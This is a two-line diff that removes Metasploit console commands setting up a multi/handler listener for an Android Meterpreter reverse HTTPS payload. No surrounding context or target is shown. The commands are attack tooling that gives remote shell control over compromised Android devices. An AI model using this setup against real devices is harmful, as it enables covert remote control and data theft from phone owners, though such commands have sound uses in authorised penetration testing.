@@ -1,2 +1,0 @@
-use exploit/multi/handler
-set payload android/meterpreter/reverse_https
